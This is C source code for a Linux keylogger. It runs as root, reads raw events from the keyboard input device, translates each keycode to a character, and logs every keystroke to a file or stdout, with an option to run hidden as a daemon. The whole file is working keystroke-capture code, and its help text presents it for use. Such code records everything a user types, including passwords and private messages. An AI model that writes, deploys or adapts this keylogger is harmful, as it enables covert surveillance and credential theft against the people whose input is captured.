/*
 * keylogger.c
 * 
 * start keylogger
 *
 * 2013 Gabriel Alonso <gbr.alonso@gmail.com>
 * 
 * @TODO: autodetect keyboard map
 *
 */

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include <linux/input.h>
#include <sys/types.h>
#include "get_keyboard.h"
#include "tasmania.h"

int main(int argc, char *argv[])
{
	char option;
	int option_index;

	char stream_path[256];
	int stream_file_handler;
		
	struct input_event ev;

	char *log_file;
	FILE *log;

	log_file = 0;
	log = stdout;

	int tasmanize = 0;

	char *keycode[256] =
	{ "", "<esc>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	  "-", "=", "<backspace>",
	  "<tab>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[",
	  "]", "\n", "<control>", "a", "s", "d", "f", "g",
	  "h", "j", "k", "l", ";", "'", "", "<shift>",
	  "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
	  "/", "<shift>", "", "<alt>", " ", "<capslock>", "<f1>",
	  "<f2>", "<f3>", "<f4>", "<f5>", "<f6>", "<f7>", "<f8>", "<f9>",
	  "<f10>", "<numlock>", "<scrolllock>", "", "", "", "", "", "", "",
	  "", "", "", "\\", "f11", "f12", "", "", "", "", "", "",
	  "", "", "<control>", "", "<sysrq>"
	};

	strcpy(stream_path, "auto");

	static struct option long_options[] = {
		{"log-file", required_argument, NULL, 'l'},
		{"stream", required_argument, NULL, 's'},
		{"deamon", no_argument, NULL, 'd'},
		{"help", no_argument, NULL, 'h'},
		{0, 0, 0, 0}
	};

	while ((option = getopt_long(argc, argv, "l:s:dh", long_options, &option_index)) != -1) 
	{
		switch (option) {
			case 'l':
				log_file = optarg;
				break;
			case 's':
				strncpy(stream_path, optarg, sizeof(stream_path));
				break;
			case 'd':
				tasmanize = 1;
				break;
			case 'h':
			case '?':
			default:
				fprintf(stderr, "Keylogger V 1.0.0\n\n");
				fprintf(stderr, "Usage: %s [OPTION]...\n", argv[0]);
				fprintf(stderr, "  -l, --log-file <file>            write log to FILE (default=stdout)\n");
				fprintf(stderr, "  -s, --stream <stream-path>       stream to device\n");
				fprintf(stderr, "  -d, --deamon                     run as deamon\n");
				fprintf(stderr, "  -h, --help                       show this message\n");
				fprintf(stderr, "  \n");
				return option == 'h' ? EXIT_SUCCESS : EXIT_FAILURE;
		}
	}

	if ((getuid ()) != 0)
	{
		printf ("You are not root! This will not work...\n");
		return EXIT_FAILURE;
	}

	if (log_file && strlen(log_file) != 1 && log_file[0] != '-' && log_file[1] != '\0') 
	{
		if (!(log = fopen(log_file, "w"))) {
			perror("fopen");
			return EXIT_FAILURE;
		}
		close(STDOUT_FILENO);
	}

	if (!strcmp(stream_path, "auto")) 
	{
		if (get_keyboard(stream_path, sizeof(stream_path)) == -1) {
			fprintf(stderr, "Can't find default event device.\nTry passing it manually with --event-device or -e.\n");
			return EXIT_FAILURE;
		}
	}

	if ((stream_file_handler = open(stream_path, O_RDONLY | O_NOCTTY)) < 0) 
	{
		perror("open");
		fprintf(stderr, "Can't read your input device...\n");
		return EXIT_FAILURE;
	}

	if(tasmanize)
		tasmanizame();

	int zzz = 1;

	while (zzz > 0) 
	{
		zzz = read(stream_file_handler, &ev, sizeof(ev));

		if (ev.value == 1 && ev.type == 1)
		{
			if (keycode[ev.code] != NULL)
			{
				fprintf(log, "%s", keycode[ev.code]);
				fflush(log);
			}
		}
	}

	fclose(log);
	close(stream_file_handler);
}